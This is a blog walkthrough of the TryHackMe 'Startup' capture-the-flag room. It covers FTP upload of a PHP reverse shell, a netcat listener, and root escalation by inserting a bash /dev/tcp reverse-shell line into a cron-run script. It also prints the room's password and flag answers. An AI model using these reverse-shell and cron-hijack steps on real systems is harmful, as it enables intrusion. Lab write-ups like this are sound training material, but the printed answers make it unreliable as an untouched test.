---
title: "THM Startup Walkthrough"
date: "2025-04-08"

layout: ../../layouts/PostLayout.astro
description: "Detail walkthrough on tryhackme machine startup."

img_path : "/images/startup/theme.png"
img_alt: "web image"
---

# Try Hack Me Room: Startup

![CTF](/images/startup/startup.png)

## Task1: Welcome to Spice Hut!

![CTF](/images/startup/chilli.png)

“We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. To be truthful, we aren't sure if our developers know what they are doing and our security concerns are rising. We ask that you perform a thorough penetration test and try to own the root. Good luck!”

First let’s start the reconnaissance by doing nmap.

![CTF](/images/startup/nmap.png)

3 ports were open.

Port 80 is open so let’s check the http website

![CTF](/images/startup/webpage.png)

There is only one message left by the dev team.

### What is the secret spicy soup recipe?
Since FTP is open, let’s try to login to ftp as anonymous.

![CTF](/images/startup/ftp.png)

List of files and directories inside ftp

![CTF](/images/startup/ls.png)

Now let’s download those files with the ‘get’ command.


This is the important.jpg 

![CTF](/images/startup/important.jpg)

This the notice.txt 

![CTF](/images/startup/notice.png)

From this notice i found one of the username “Maya”

Next I also change the directory to ftp and ls the directories inside it but there are only hidden files.

![CTF](/images/startup/cdftp.png)

Let’s use ffuf and find the directories in http port.

![CTF](/images/startup/ffuf.png)

I found that /files path is there in http port, now let’s check it out.

![CTF](/images/startup/file.png)

Wow, this is a ftp service. We can use this to get access to the machine by uploading a shell to the FTP service and executing it in our browser. I will upload the php reverse shell file, which I saved in php-reverse-shell.php.

To upload the file to the ftp directory on the FTP service, the command is put php-reverse-shell.php.

![CTF](/images/startup/put.png)

I see that a shell.php file is uploaded. We’ll start a netcat listener using the following command: nc -lvnp 1234

![CTF](/images/startup/netcat.png)

With our listener set up, we can click the php-reverse-shell.php file in our browser.

<b>ANS:</b> love


### What are the contents of user.txt?
We got the password for linnie i.e c4ntg3t3n0ughsp1c3, now let’s login using ssh.

![CTF](/images/startup/pass.png)

BOOM! Here i got the user.txt file and the flag

<b>ANS:</b> THM{03ce3d619b80ccbfb3b7fc81e46c0e79}

### What are the contents of root.txt?
Now it’s time to get the root flag. Linnie has 2 other directories that are Documents and scripts. In scripts directories there is something useful.

![CTF](/images/startup/echo.png)

I could see that planner.sh is running every minute and modifying the contents of startup_list.txt.
we can modify /etc/print.sh. I can put the bash command into the print.sh script:<br>
bash -i >& /dev/tcp/10.10.51.47/4444 0>&1

![CTF](/images/startup/nano.png)

I opened a listener in my terminal and in a minute I received the connection( we need to wait a little).

![CTF](/images/startup/root.png)

Finally list the files and grab the root flag.

<b>ANS:</b> THM{f963aaa6a430f210222158ae15c3d76d}

That’s it for this startup room, see you guys on the next try hack me room walkthrough.
